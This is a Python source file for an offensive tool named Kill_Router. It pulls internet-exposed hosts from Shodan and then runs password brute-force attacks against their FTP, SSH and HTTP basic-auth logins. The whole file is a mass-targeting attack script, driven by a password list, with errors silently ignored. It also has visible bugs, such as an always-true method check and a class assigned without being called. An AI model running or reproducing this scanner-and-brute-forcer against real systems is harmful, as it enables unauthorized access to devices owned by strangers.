#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys

from ftp import FTP
from ssh import SSH
from basic_auth import Basic_Auth
from passlists import Passlist
from shodan_search import Shodan_Search

class Kill_Router(object):

    def __init__(self):
        pass

    def shodan_search(self, args):

        shodan = Shodan_Search()

        if shodan.validateapi():
            results = shodan.search(args.shodan)
            response = raw_input('YOU WANT TO TEST SHODAN RESULTS? Y/N: ').upper().strip()

            if response == "Y":

                parser = Passlist(args.passlist)

                for result in results['matches']:

                    passwords = parser.get_list()

                    try:

                        if args.method is None:

                            if result['port'] == 21:
                                method = "ftp"
                                Attack = FTP()

                            if result['port'] == 22:
                                method = "ssh"
                                Attack = SSH()

                            if result['port'] == 443:
                                method = "https"
                                Attack = Basic_Auth()

                            else:
                                args.method = "http"
                                Attack = Basic_Auth()

                        else:

                            if args.method == "http":
                                method = "http"
                                Attack = Basic_Auth()

                            if args.method == "https":
                                method = "https"
                                Attack = Basic_Auth

                            if args.method == "ftp":
                                method = "ftp"
                                Attack = FTP()

                            if args.method == "ssh":
                                method = "ssh"
                                Attack = SSH()

                        Attack.brute_force(result['ip_str'], result['port'], args.username, passwords, method)

                    except:
                        pass


            else:
                sys.exit()

        else:
            sys.exit()

    def bruteforce(self,target,port,method,passlist,username):

        parser = Passlist(passlist)
        passwords = parser.get_list()

        if method == "http" or "https":
            attack = Basic_Auth()

        if method == "ssh":
            attack = SSH()

        if method == "ftp":
            attack = FTP()


        attack.brute_force(target, port, username, passwords, method)






